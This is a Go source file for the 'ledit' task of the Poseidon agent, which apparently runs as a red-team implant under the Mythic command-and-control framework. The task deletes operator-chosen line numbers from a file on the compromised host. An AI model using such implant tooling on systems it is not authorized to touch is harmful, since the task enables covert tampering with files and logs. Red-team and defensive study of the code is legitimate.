//go:build (linux || darwin) && (ledit || debug)

package ledit

import (
	// Standard
	"encoding/json"
	"fmt"
	"io"
	"os"
	"strconv"
	"strings"

	// Poseidon
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/tasks/taskRegistrar"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/files"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

func init() {
	taskRegistrar.Register("ledit", Run)
}

type Arguments struct {
	Numbers string `json:"numbers"`
	Path    string `json:"path"`
}

func Run(task structs.Task) {
	msg := task.NewResponse()

	args, err := parseArguments(task.Params)
	if err != nil {
		msg.SetError(fmt.Sprintf("failed to parse arguments %v", err))
		task.Job.SendResponses <- msg
		return
	}

	if strings.TrimSpace(args.Path) == "" {
		msg.SetError("path is required")
		task.Job.SendResponses <- msg
		return
	}

	if strings.TrimSpace(args.Numbers) == "" {
		msg.SetError("numbers is required")
		task.Job.SendResponses <- msg
		return
	}

	contents, err := readFileContents(args.Path)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}

	contentsString := string(contents)
	lines := strings.Split(contentsString, "\n")

	lineCount := len(lines)
	if lineCount > 0 && lines[lineCount-1] == "" {
		lineCount--
	}

	remove := make(map[int]struct{})

	for _, value := range strings.Split(args.Numbers, ",") {
		number, err := strconv.Atoi(strings.TrimSpace(value))
		if err != nil || number < 1 || number > lineCount {
			msg.SetError(fmt.Sprintf("invaid line number: %v", value))
			task.Job.SendResponses <- msg
			return
		}
		remove[number] = struct{}{}
	}

	remaining := make([]string, 0, len(lines))
	for index, line := range lines {
		if _, shouldRemove := remove[index+1]; !shouldRemove {
			remaining = append(remaining, line)
		}
	}

	cleanContents := strings.Join(remaining, "\n")

	file, err := os.OpenFile(args.Path, os.O_WRONLY|os.O_TRUNC, 0)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}

	_, writeErr := io.WriteString(file, cleanContents)
	closeErr := file.Close()

	if writeErr != nil {
		msg.SetError(writeErr.Error())
		task.Job.SendResponses <- msg
		return
	}

	if closeErr != nil {
		msg.SetError(closeErr.Error())
		task.Job.SendResponses <- msg
		return
	}

	msg.UserOutput = fmt.Sprintf("Successfully removed lines: %v", args.Numbers)
	msg.Completed = true
	task.Job.SendResponses <- msg

}

func parseArguments(params string) (Arguments, error) {
	var args Arguments
	err := json.Unmarshal([]byte(params), &args)
	return args, err
}

func readFileContents(path string) ([]byte, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	info, err := f.Stat()
	if err != nil {
		return nil, err
	}

	if info.Size() > (5 * files.FILE_CHUNK_SIZE) {
		return nil, fmt.Errorf("File size > 5MB, please download instead")
	}

	cont, err := io.ReadAll(f)
	if err != nil {
		return nil, err
	}
	return cont, nil
}
